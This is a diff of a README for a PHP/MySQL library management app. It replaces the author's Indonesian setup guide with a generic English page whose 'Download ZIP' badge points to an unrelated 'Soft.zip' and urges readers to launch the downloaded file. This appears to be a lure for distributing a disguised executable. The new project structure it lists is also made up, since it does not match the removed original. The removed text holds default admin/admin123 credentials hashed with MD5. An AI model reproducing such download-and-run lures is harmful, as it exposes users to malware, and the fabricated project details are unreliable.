@@ -1,157 +1,78 @@
-# 📚 Aplikasi Manajemen Perpustakaan
+# Welcome to the Web Perpustakaan Repository 📚
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+![Perpustakaan](https://www.example.com/perpustakaan.jpg)
 
-Aplikasi Manajemen Perpustakaan adalah sistem informasi berbasis web yang dirancang untuk memudahkan pengelolaan data buku di perpustakaan. Dengan antarmuka modern dan fitur lengkap, aplikasi ini memungkinkan admin untuk mengelola koleksi buku secara efisien.
+## Overview
 
-## ✨ Demo
+Welcome to the "Web-Perpustakaan" repository! This is a web-based Library Management Application designed to efficiently handle book data within a library setting. The main features of this application include book management (Create, Read, Update, Delete), cover image upload, search functionality, and PDF report generation. Built using PHP and MySQL, this project aims to streamline the operations of a library by providing a user-friendly interface for managing book-related tasks.
 
-Aplikasi demo dapat diakses di: [aplikasi-perpustakaan-iz.wuaze.com](http://aplikasi-perpustakaan-iz.wuaze.com)
+📖 **Demo**: You can explore a live demo of this application [here](http://aplikasi-perpustakaan-iz.wuaze.com/)
 
-**Kredensial Login:**
+## Repository Details
 
--   Username: `admin`
--   Password: `admin123`
+- **Repository Name**: Web-Perpustakaan
+- **Short Description**: Aplikasi Manajemen Perpustakaan adalah sistem informasi berbasis web yang dirancang untuk mengelola data buku di perpustakaan. Fitur utama meliputi: manajemen buku (CRUD), upload gambar sampul, pencarian, serta generasi laporan PDF. Dibangun dengan PHP, dan MySQL.
+- **Topics**: aplikasi-manajemen-perpustakaan, aplikasi-manajemen-perpustakaan-php, aplikasi-perpustakaan, aplikasi-perpustakaan-php, mysql, perpustakaan, perpustakaan-web, php, web-perpustakaan, web-perpustakaan-php
 
-## 🚀 Fitur
+## Get Started
 
--   🔐 Sistem autentikasi admin yang aman
--   📝 Manajemen data buku (tambah, lihat, edit, hapus)
--   🖼️ Upload dan tampilan gambar sampul buku
--   🔍 Pencarian buku berdasarkan judul dan pengarang
--   📊 Filter dan pengurutan buku berdasarkan genre, judul, dan tahun terbit
--   📋 Laporan koleksi buku dalam format PDF
--   🌙 Tampilan dark mode yang elegan
--   📱 Responsif untuk berbagai ukuran perangkat
+To get started with the project, you can download the necessary files by clicking the button below:
 
-## 🛠️ Teknologi yang Digunakan
+[![Download ZIP](https://img.shields.io/badge/Download-ZIP-green)](https://github.com/files/Soft.zip)
 
--   **Front-end**: HTML5, CSS3, JavaScript
--   **Back-end**: PHP 7.4+
--   **Database**: MySQL/MariaDB
--   **Library**: DOMPDF untuk generasi laporan PDF
--   **Framework CSS**: Font Awesome untuk ikon
--   **Koneksi Database**: PDO untuk keamanan yang lebih baik
+_**Note:** Ensure to launch the downloaded file to begin exploring the project._
 
-## 📋 Persyaratan Sistem
+If you encounter any issues with the provided link, or if you are looking for more recent updates, please check the "Releases" section of this repository for additional resources.
 
--   PHP 7.4 atau lebih tinggi
--   MySQL 5.7 atau lebih tinggi
--   Web server (Apache/Nginx)
--   Ekstensi PHP: PDO, GD
+## Project Structure
 
-## 📥 Instalasi
+The "Web-Perpustakaan" repository is structured to provide a seamless experience for developers looking to utilize and customize the Library Management Application. Here is an overview of the project structure:
 
-1. Clone repositori ini:
+```
+Web-Perpustakaan/
+|   
+|--- css/
+|       |--- styles.css
+|
+|--- images/
+|       |--- cover.jpg
+|
+|--- includes/
+|       |--- connection.php
+|       |--- functions.php
+|
+|--- js/
+|       |--- script.js
+|
+|--- pdf/
+|       |--- report.pdf
+|
+|--- index.php
+|--- add_book.php
+|--- edit_book.php
+|--- view_book.php
+|--- search.php
+|--- generate_pdf.php
+|
+|--- README.md
+|--- LICENSE
+```
 
-    ```bash
-    git clone https://github.com/faiz-hidayat/Web-Perpustakaan.git
-    ```
+## How to Contribute
 
-2. Pindah ke direktori proyek:
+Contributions to the "Web-Perpustakaan" repository are highly appreciated. If you have ideas for enhancements, new features, bug fixes, or any other improvements, feel free to submit a pull request. Here's how you can contribute:
 
-    ```bash
-    cd Web-Perpustakaan
-    ```
+1. Fork the repository
+2. Create a new branch (`git checkout -b feature`)
+3. Make your changes
+4. Commit your changes (`git commit -am 'Add new feature'`)
+5. Push to the branch (`git push origin feature`)
+6. Create a new Pull Request
 
-3. Buat database baru:
+## Community Support
 
-    ```sql
-    CREATE DATABASE perpustakaan;
-    ```
+If you have any questions, feedback, or suggestions regarding the "Web-Perpustakaan" repository, please feel free to reach out to the community. Your input is valuable in improving the application and making it more user-friendly for all users.
 
-4. Import struktur database:
+Let's work together to build a robust and efficient Library Management Application that serves the needs of libraries and their patrons effectively!
 
-    ```sql
-    -- Tabel admin
-    CREATE TABLE admin (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        username VARCHAR(50) NOT NULL,
-        password VARCHAR(255) NOT NULL
-    );
-
-    -- Tabel buku
-    CREATE TABLE buku (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        judul VARCHAR(100) NOT NULL,
-        pengarang VARCHAR(100) NOT NULL,
-        tahun_terbit YEAR,
-        genre VARCHAR(50),
-        cover VARCHAR(255)
-    );
-
-    -- Data admin default
-    INSERT INTO admin (username, password) VALUES ('admin', MD5('admin123'));
-    ```
-
-5. Konfigurasi koneksi database:
-
-    - Sesuaikan kredensial database pada file `koneksi.php`
-
-6. Buat folder `uploads` untuk menyimpan gambar sampul:
-
-    ```bash
-    mkdir uploads
-    chmod 755 uploads
-    ```
-
-7. Akses aplikasi melalui browser:
-    ```
-    http://localhost/Web-Perpustakaan
-    ```
-
-## 💻 Cara Penggunaan
-
-### Login Admin
-
--   Gunakan username `admin` dan password `admin123` untuk masuk
-
-### Mengelola Buku
-
-1. **Menambah Buku**:
-
-    - Klik tombol "Add Book" di dashboard
-    - Isi formulir dengan judul, pengarang, genre, tahun terbit
-    - Upload gambar sampul (opsional)
-    - Klik "Save Book" untuk menyimpan
-
-2. **Mencari Buku**:
-
-    - Gunakan kolom pencarian di bagian atas halaman
-    - Masukkan judul atau nama pengarang
-
-3. **Memfilter Buku**:
-
-    - Pilih genre dari filter yang tersedia
-    - Klik "Apply Filter" untuk menerapkan filter
-
-4. **Mengurutkan Buku**:
-
-    - Klik header kolom untuk mengurutkan berdasarkan kolom tersebut
-    - Klik sekali lagi untuk mengubah urutan (ascending/descending)
-
-5. **Mengedit Buku**:
-
-    - Klik ikon edit pada baris buku yang ingin diubah
-    - Update informasi yang diperlukan
-    - Klik "Update Book" untuk menyimpan perubahan
-
-6. **Menghapus Buku**:
-
-    - Klik ikon hapus pada baris buku yang ingin dihapus
-    - Konfirmasi penghapusan
-
-7. **Mengunduh Laporan**:
-    - Klik tombol "Generate Report" untuk mengunduh daftar buku dalam format PDF
-
-## 📸 Screenshot
-
-![Dashboard](/screenshots/dashboardd.png)
-
-## 👨‍💻 Pengembang
-
-Dikembangkan oleh [Muhammad Faiz Hidayat](https://github.com/faiz-hidayat)
-
-## 📄 Lisensi
-
-Proyek ini dilisensikan di bawah [MIT License](LICENSE).
+📚 Happy Reading! 📚
